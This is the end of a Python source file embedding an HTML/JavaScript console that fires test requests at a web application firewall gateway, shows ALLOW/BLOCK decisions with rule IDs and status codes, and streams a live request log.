                const isAllowed = (r.status_code === 200);
                updatePipelineVisualization(r.stage, isAllowed, r.status_code, r.rule_id);

                document.getElementById('responseViewer').innerText = JSON.stringify(r.json || r, null, 2);
                document.getElementById('decisionViewer').innerText = JSON.stringify({{
                    action: isAllowed ? 'ALLOW' : 'BLOCK',
                    pipeline_stage: r.stage,
                    rule_id: r.rule_id,
                    status_code: r.status_code,
                    reason: r.reason,
                    latency_ms: r.latency_ms
                }}, null, 2);

                if (r.status_code === data.attack.expected_status) {{
                    statusCell.innerHTML = `<span class="badge bg-success"><i class="fa-solid fa-check me-1"></i>${{r.status_code}} (${{r.rule_id}})</span>`;
                }} else {{
                    statusCell.innerHTML = `<span class="badge bg-warning text-dark">${{r.status_code}}</span>`;
                }}
            }} catch (err) {{
                statusCell.innerHTML = '<span class="badge bg-danger">ERR</span>';
            }}
        }}

        async function runAllSequential() {{
            for (let item of MATRIX) {{
                await fireAttack(item.id);
                await new Promise(resolve => setTimeout(resolve, 300));
            }}
        }}

        // Live Log SSE stream listener
        function initLogStream() {{
            const eventSource = new EventSource('/api/logs/stream');
            const tbody = document.getElementById('liveLogTbody');

            eventSource.onmessage = function(e) {{
                try {{
                    const entry = JSON.parse(e.data);
                    if (!entry.timestamp) return;

                    const timeStr = entry.timestamp.split('T')[1].split('.')[0];
                    let actionBadge = (entry.action === 'ALLOW') ? '<span class="badge bg-success">ALLOW</span>' : '<span class="badge bg-danger">BLOCK</span>';
                    let statusBadge = (entry.status_code === 200) ? '<span class="text-success fw-bold">200</span>' : ((entry.status_code === 429) ? '<span class="text-warning fw-bold">429</span>' : '<span class="text-danger fw-bold">403</span>');

                    const tr = document.createElement('tr');
                    tr.innerHTML = `
                        <td class="text-secondary">${{timeStr}}</td>
                        <td><span class="badge bg-dark">${{entry.method}}</span></td>
                        <td><small class="text-info">${{entry.pipeline_stage || '-'}}</small></td>
                        <td><code class="text-warning">${{entry.rule_id || '-'}}</code></td>
                        <td>${{actionBadge}}</td>
                        <td>${{statusBadge}}</td>
                    `;
                    tbody.insertBefore(tr, tbody.firstChild);

                    if (tbody.children.length > 40) {{
                        tbody.removeChild(tbody.lastChild);
                    }}
                }} catch(err) {{}}
            }};
        }}

        window.onload = function() {{
            renderMatrix();
            initLogStream();
        }};
    </script>
</body>
</html>
"""
    return HTMLResponse(content=html)


if __name__ == "__main__":
    print("==================================================================")
    print(" [*] WAF Live Attack Console & Pipeline Visualizer")
    print(f" [*] Target Gateway: {TARGET_BASE_URL}")
    print(" [*] Open Console UI in browser: http://localhost:9000")
    print("==================================================================")
    uvicorn.run(app, host="0.0.0.0", port=9000)
